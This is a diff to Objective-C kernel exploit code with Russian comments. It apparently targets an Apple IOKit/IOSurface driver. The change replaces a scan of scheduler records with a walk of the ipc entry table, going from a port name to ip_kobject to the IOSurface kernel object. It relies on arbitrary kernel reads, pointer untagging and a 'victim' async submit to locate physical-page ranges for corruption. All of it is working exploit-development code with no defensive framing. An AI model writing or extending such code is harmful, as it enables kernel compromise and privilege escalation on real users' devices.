@@ -5817,63 +5817,39 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     *(uint64_t *)(tsdV + 8) = 1;   // async
     kern_return_t avkr = IOConnectCallMethod(victim, 1, NULL, 0, tsdV, sizeof(tsdV), NULL, NULL, NULL, NULL);
     kpNote(r, [NSString stringWithFormat:@"  victim async submit (backlog=400): kr=0x%x", avkr]);
-    // записи очереди scheduler'а (churn-опы несут dstS) — полный скан записи
-    // 0x21c0 chain-верификацией (раунд 19: surface ptr НЕ в заголовке 0x00-0x80,
-    // а в cfg/per-plane регионах 0x400+; band-фильтр на указатели)
-    uint64_t driverVA = kpM2TClientVA(r, isTable, svc, @"driver");
-    uint64_t schedVA = 0;
-    if (driverVA) {
-        uint64_t cand[64];
-        uint32_t candN = kpM2OCollectPtrs(driverVA, 0x800, cand, 64, r);
-        for (uint32_t i = 0; i < candN && !schedVA; i++) {
-            uint64_t cnt = 0, arr = 0, arr2 = 0;
-            if (!kpRead(cand[i] + 0xb8, &cnt, 8, "ps sch+b8", r)) continue;
-            if (!kpRead(cand[i] + 0xc8, &arr, 8, "ps sch+c8", r)) continue;
-            if (!kpRead(cand[i] + 0x110, &arr2, 8, "ps sch+110", r)) continue;
-            arr = kp_untag_ptr(arr);
-            arr2 = kp_untag_ptr(arr2);
-            if (cnt > 0x2000) continue;
-            if (!kpLooksLikeKernelPointer(arr) || !kpLooksLikeKernelPointer(arr2)) continue;
-            schedVA = cand[i];
-        }
-    }
-    kpNote(r, [NSString stringWithFormat:@"  driverVA=%#llx schedVA=%#llx", (unsigned long long)driverVA, (unsigned long long)schedVA]);
+    // 3. Резолв surfVA через USERSPACE IOSurface-структуру (1.9.132): она в
+    //    нашей памяти — читаем напрямую, находим mach-порт и резолвим его
+    //    kobject через ДОВЕРЕННУЮ ipc-цепочку (port → ip_kobject = IOSurface
+    //    kernel object). Никаких UC-таблиц/op-записей/роминга по scheduler'у.
     uint64_t surfVA = 0, rangesVA = 0;
-    if (schedVA) {
-        uint64_t eptrs[128];
-        uint32_t eN = kpM2OCollectEntries(schedVA, eptrs, 128, r);
-        kpNote(r, [NSString stringWithFormat:@"  entries=%u — полный скан записей (0x21c0)", eN]);
-        for (uint32_t i = 0; i < eN && i < 8 && !rangesVA; i++) {
-            uint8_t ebuf[0x2200];
-            memset(ebuf, 0, sizeof(ebuf));
-            // 1.9.129: kpRead не транслирует регион op-записей (0xffffffdf…,
-            // kvtophys=0 — прогон 1.9.128). Читаем kreadbuf'ом — тот же путь,
-            // которым читаются proc'ы в этом регионе.
-            if (!kreadbuf(eptrs[i], ebuf, sizeof(ebuf))) continue;
-            for (uint32_t eo = 0; eo + 8 <= sizeof(ebuf) && !rangesVA; eo += 8) {
-                uint64_t S = 0;
-                memcpy(&S, ebuf + eo, 8);
-                S = kp_untag_ptr(S);
-                if (S < 0xffffffdc00000000ULL || S >= 0xffffffe400000000ULL) continue;
-                uint64_t ro = 0, rq = 0;
-                if (!kreadbuf(S + 0x178, &ro, 8)) continue;
-                ro = kp_untag_ptr(ro);
-                if (ro < 0xffffffdc00000000ULL || ro >= 0xffffffe400000000ULL) continue;
-                if (!kreadbuf(ro + 0x18, &rq, 8)) continue;
-                // 1.9.131: печатаем САМО значение ro+0x18 (не только матч) —
-                // раунд 20: ranges могут хранить DVA>>14, не PA>>14 — тогда
-                // верификация по PA закономерно даёт ноль. Видим кодировку.
-                if (i == 0 && rangesVA == 0) {
-                    kpNote(r, [NSString stringWithFormat:@"    кандидат entry[0]+%#x: S=%#llx ro+0x18=%#018llx (pfn32 PA=%#x)", eo,
-                              (unsigned long long)S, (unsigned long long)rq, pfn32]);
-                }
-                if ((uint32_t)(rq >> 32) != pfn32 || (uint32_t)rq != 1) continue;
-                surfVA = S;
-                rangesVA = ro + 0x18;
-                kpNote(r, [NSString stringWithFormat:@"  ★ entry[%u]+%#x: surfVA=%#llx rangeObj=%#llx rangesVA=%#llx (qword=%#018llx)",
-                          i, eo, (unsigned long long)surfVA, (unsigned long long)ro,
-                          (unsigned long long)rangesVA, (unsigned long long)rq]);
-            }
+    {
+        uint8_t *usp = (uint8_t *)dstS;   // userspace __IOSurface struct
+        for (uint32_t oo = 0; oo < 0x40; oo += 8) {
+            uint64_t q = *(volatile uint64_t *)(usp + oo);
+            kpNote(r, [NSString stringWithFormat:@"    usp+%#02x = %#018llx", oo, (unsigned long long)q]);
+        }
+        for (uint32_t oo = 0; oo < 0x100 && !rangesVA; oo += 4) {
+            uint32_t name = *(volatile uint32_t *)(usp + oo);
+            if (!name || name > 0xFFFFFF) continue;   // правдоподобное имя порта
+            uint64_t eVA = isTable + (uint64_t)sizeof_ipc_entry * (name >> 8);
+            uint64_t oRaw = 0, kRaw = 0;
+            if (!kreadbuf(eVA + off_ipc_entry_ie_object, &oRaw, 8) || !oRaw) continue;
+            uint64_t portVA = kp_untag_ptr(oRaw);
+            if (!kpLooksLikeKernelPointer(portVA)) continue;
+            if (!kreadbuf(portVA + off_ipc_port_ip_kobject, &kRaw, 8) || !kRaw) continue;
+            uint64_t kobj = kp_untag_ptr(kRaw);
+            if (!kpLooksLikeKernelPointer(kobj)) continue;
+            uint64_t ro = 0, rq = 0;
+            if (!kreadbuf(kobj + 0x178, &ro, 8)) continue;
+            ro = kp_untag_ptr(ro);
+            if (!kpLooksLikeKernelPointer(ro)) continue;
+            if (!kreadbuf(ro + 0x18, &rq, 8)) continue;
+            if ((uint32_t)(rq >> 32) != pfn32 || (uint32_t)rq != 1) continue;
+            surfVA = kobj;
+            rangesVA = ro + 0x18;
+            kpNote(r, [NSString stringWithFormat:@"  ★ usp+%#x port=%#x: surfVA=%#llx rangeObj=%#llx rangesVA=%#llx (qword=%#018llx)",
+                      oo, name, (unsigned long long)surfVA, (unsigned long long)ro,
+                      (unsigned long long)rangesVA, (unsigned long long)rq]);
         }
     }
     kpNote(r, [NSString stringWithFormat:@"  резолв: surfVA=%#llx rangesVA=%#llx",
